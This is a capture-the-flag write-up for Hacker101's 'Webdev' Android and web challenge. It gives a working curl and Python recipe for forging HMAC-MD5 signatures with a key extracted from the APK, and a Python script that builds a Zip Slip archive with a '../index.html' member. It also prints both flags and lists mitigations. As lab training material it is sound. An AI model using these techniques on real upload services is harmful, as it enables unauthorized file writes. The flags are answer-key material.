# Webdev (Hacker101 — Android + web)

Mini CMS with **`/content/`** static pages, **`edit.php` / `save.php`**, and a **signed ZIP upload** on **`upload.php`**. The APK is a thin **WebView** client; the HMAC **key is hard-coded** in the app. **Two flags.**

**Example instance:** `https://ba1225d2ecebc5a2aad20f17425ad978.ctf.hacker101.com/`  
**Artifact:** [`webdev.apk`](https://ba1225d2ecebc5a2aad20f17425ad978.ctf.hacker101.com/webdev.apk)

---

## Reconnaissance

### Web

| Path | Role |
|------|------|
| `/content/` | Serves `index.html` (editable copy). |
| `/edit.php` | Form to edit `index.html` → `POST save.php`. |
| `/upload.php` | Multipart upload of **`.zip`**; requires **`hmac`** field. |

Upload without `hmac` → **`HMAC missing.`**  
Wrong length → **`HMAC must be 16 bytes long (32 nibbles of hex)`** → server expects **32 hex characters** (e.g. **HMAC-MD5** output).

### Android (`com.hacker101.webdev.MainActivity`)

- Loads `https://<host>/content/` and toggles to `/edit.php`.
- Defines **`HmacKey`** as a **64-character hex string** (32 bytes when decoded):

```text
8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d
```

- `Hmac()` is left as `TODO` in source — you implement the same logic for scripted uploads.

---

## Flag 1 — Valid signed upload

1. Build any small **ZIP** (e.g. one harmless file).
2. Let **`K = bytes.fromhex(HmacKey)`** and **`D = raw_zip_bytes`**.
3. Compute **`hmac = HMAC-MD5(K, D).hexdigest()`** (32 hex chars).
4. **`POST upload.php`** with form field **`file`** (the zip) and **`hmac`** (the digest).

**Response** includes the first flag (and a note that extraction is TODO / temp folder).

### cURL example

```bash
BASE="https://ba1225d2ecebc5a2aad20f17425ad978.ctf.hacker101.com"
KEY_HEX="8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d"
printf 'x' > /tmp/a.txt && zip -q -j /tmp/u.zip /tmp/a.txt
SIG=$(python3 - <<PY
import hmac, hashlib
k = bytes.fromhex("$KEY_HEX")
d = open("/tmp/u.zip", "rb").read()
print(hmac.new(k, d, hashlib.md5).hexdigest())
PY
)
curl -sS -F "file=@/tmp/u.zip" -F "hmac=$SIG" "$BASE/upload.php"
```

**Example flag (this instance):**  
`^FLAG^8a7e83109c87053fe33383f4fd39a6c8a58d4ecd0ce0dab2f1b0cb50cb302bd1$FLAG$`

---

## Flag 2 — Path traversal inside the ZIP

After HMAC checks pass, the server extracts the archive. Include a **Zip Slip** entry whose path escapes the intended directory (e.g. **`../index.html`** relative to the extract root).

Repeat the same **HMAC-MD5** over the **entire malicious ZIP file** and upload.

**Response** adds a **“Path traversal”** line with the second flag.

### Python example (build slip + sign)

```python
import zipfile, hmac, hashlib, io

KEY = bytes.fromhex("8c34bac50d9b096d41cafb53683b315690acf65a11b5f63250c61f7718fa1d1d")

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr("../index.html", b"<p>ZIP SLIP</p>")

data = buf.getvalue()
sig = hmac.new(KEY, data, hashlib.md5).hexdigest()
# POST multipart: file=data, hmac=sig
```

**Example flag (this instance):**  
`^FLAG^7d51e56ed19d4283bc279877b2dec1d1e402b1eae53ab68f4a89fdcc17567e94$FLAG$`

---

## Summary

| # | Trigger |
|---|---------|
| 1 | Correct **HMAC-MD5** of the ZIP using the **hex-decoded key** from the APK. |
| 2 | Same, plus a **path-traversal member** inside the ZIP. |

---

## Mitigations

- **Never** ship HMAC/API keys in mobile clients; use per-user server-side secrets or attested channels.
- Normalize ZIP member paths and reject **`..`**, absolute paths, and drive letters on extract.
- Prefer streaming verification without writing attacker-controlled paths to disk.

---

## Tools

**jadx**, **Python** (`hmac`, `hashlib`, `zipfile`), **curl**.
